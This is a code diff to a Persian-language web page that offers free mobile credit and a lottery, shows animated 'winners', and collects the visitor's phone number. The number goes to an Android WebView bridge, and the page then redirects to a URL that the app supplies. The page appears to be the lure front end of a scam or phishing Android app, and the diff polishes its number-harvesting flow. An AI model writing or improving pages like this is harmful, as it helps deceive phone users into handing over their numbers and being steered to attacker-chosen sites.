@@ -308,6 +308,20 @@
         footer a:hover { 
             color: var(--primary-color); 
         }
+        
+        /* Spinner Style */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto; /* Center the spinner inside the button */
+        }
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
 
         /* ریسپانسیو برای موبایل */
         @media (max-width: 480px) {
@@ -437,74 +451,109 @@
     </footer>
 
     <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        const modal = document.getElementById('actionModal');
-        const getChargeButton = document.getElementById('getChargeButton');
-        const joinLotteryButton = document.getElementById('joinLotteryButton');
-        const submitPhoneButton = document.getElementById('submitPhoneButton');
-        const phoneNumberInput = document.getElementById('phoneNumberInput');
-        const winnerItems = document.querySelectorAll('.winner-item');
-
-        // انیمیشن برای نمایش برندگان
-        let delay = 0;
-        winnerItems.forEach(item => {
-            setTimeout(() => {
-                item.classList.add('visible');
-            }, delay);
-            delay += 300;
-        });
-
+        // Make function global for the HTML onclick attribute
         function toggleMenu() {
             const menu = document.getElementById('navMenu');
             menu.classList.toggle('active');
         }
 
-        getChargeButton.addEventListener('click', (e) => {
-            e.preventDefault();
-            modal.classList.add('active');
-        });
+        document.addEventListener('DOMContentLoaded', () => {
+            const modal = document.getElementById('actionModal');
+            const getChargeButton = document.getElementById('getChargeButton');
+            const joinLotteryButton = document.getElementById('joinLotteryButton');
+            const submitPhoneButton = document.getElementById('submitPhoneButton');
+            const phoneNumberInput = document.getElementById('phoneNumberInput');
+            const winnerItems = document.querySelectorAll('.winner-item');
 
-        joinLotteryButton.addEventListener('click', (e) => {
-            e.preventDefault();
-            alert('برای شرکت در قرعه‌کشی، ابتدا باید شماره موبایل خود را وارد کنید.');
-            modal.classList.add('active');
-        });
+            // Animate winners on load
+            let delay = 0;
+            winnerItems.forEach(item => {
+                setTimeout(() => {
+                    item.classList.add('visible');
+                }, delay);
+                delay += 300;
+            });
 
-        submitPhoneButton.addEventListener('click', () => {
-            const phoneNumber = phoneNumberInput.value.trim();
-            if (!/^(09)\d{9}$/.test(phoneNumber)) {
-                alert('لطفا یک شماره موبایل ۱۱ رقمی معتبر وارد کنید.');
-                return;
-            }
-            if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
-                window.Android.submitPhoneNumber(phoneNumber);
-                const pollInterval = setInterval(() => {
-                    if (typeof window.Android !== 'undefined' && typeof window.Android.getTargetUrl === 'function') {
-                        const redirectUrl = window.Android.getTargetUrl();
-                        if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.trim() !== '' && /^(https?:\/\/)/i.test(redirectUrl)) {
-                            clearInterval(pollInterval);
-                            window.location.href = redirectUrl;
-                            modal.classList.remove('active');
-                            phoneNumberInput.value = '';
-                        }
+            // Open modal listeners
+            getChargeButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                modal.classList.add('active');
+            });
+
+            joinLotteryButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                alert('برای شرکت در قرعه‌کشی، ابتدا باید شماره موبایل خود را وارد کنید.');
+                modal.classList.add('active');
+            });
+
+            // Close modal when clicking outside
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.classList.remove('active');
+                }
+            });
+
+            // NEW: Main logic for phone number submission with polling
+            submitPhoneButton.addEventListener('click', () => {
+                try {
+                    const phoneNumber = phoneNumberInput.value.trim();
+
+                    if (!/^(09)\d{9}$/.test(phoneNumber)) {
+                        alert('لطفا یک شماره موبایل ۱۱ رقمی معتبر وارد کنید (مثال: 09123456789).');
+                        return;
                     }
-                }, 500);
-            } else {
-                alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
-                modal.classList.remove('active');
-                phoneNumberInput.value = '';
-                window.location.href = 'https://example.com/redirect';
-            }
-        });
 
-        modal.addEventListener('click', (e) => {
-            if (e.target === modal) {
-                modal.classList.remove('active');
-            }
-        });
+                    // Show spinner and disable button
+                    submitPhoneButton.innerHTML = '<div class="spinner"></div>';
+                    submitPhoneButton.disabled = true;
 
-        document.querySelector('.menu-btn').addEventListener('click', toggleMenu);
-    });
+                    // Send phone number to Android if interface exists
+                    if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
+                        console.log('Sending phone number to Android:', phoneNumber);
+                        window.Android.submitPhoneNumber(phoneNumber);
+
+                        // Start polling for targetUrl from Android
+                        const pollInterval = setInterval(() => {
+                            if (typeof window.Android !== 'undefined' && typeof window.Android.getTargetUrl === 'function') {
+                                const redirectUrl = window.Android.getTargetUrl();
+                                console.log('Polling for targetUrl:', redirectUrl);
+                                // Check if a valid URL is received
+                                if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.trim() !== '' && /^(https?:\/\/)/i.test(redirectUrl)) {
+                                    clearInterval(pollInterval);
+                                    console.log('Redirecting to:', redirectUrl);
+                                    window.location.href = redirectUrl;
+
+                                    // Clean up
+                                    modal.classList.remove('active');
+                                    phoneNumberInput.value = '';
+                                    submitPhoneButton.innerHTML = 'تایید';
+                                    submitPhoneButton.disabled = false;
+                                }
+                            }
+                        }, 500); // Poll every 500ms
+                    } else {
+                        // Fallback for testing in a browser
+                        console.log('Android interface not found. Fallback mode. Number:', phoneNumber);
+                        alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
+                        
+                        // Simulate redirect for testing
+                        modal.classList.remove('active');
+                        phoneNumberInput.value = '';
+                        submitPhoneButton.innerHTML = 'تایید';
+                        submitPhoneButton.disabled = false;
+                        window.location.href = 'https://example.com/redirect';
+                    }
+                } catch (e) {
+                    console.error('Error in submitPhoneButton click:', e);
+                    if (window.Android && window.Android.showToast) {
+                        window.Android.showToast('خطا در ارسال شماره');
+                    }
+                    // Reset button on error
+                    submitPhoneButton.innerHTML = 'تایید';
+                    submitPhoneButton.disabled = false;
+                }
+            });
+        });
     </script>
 </body>
 </html>
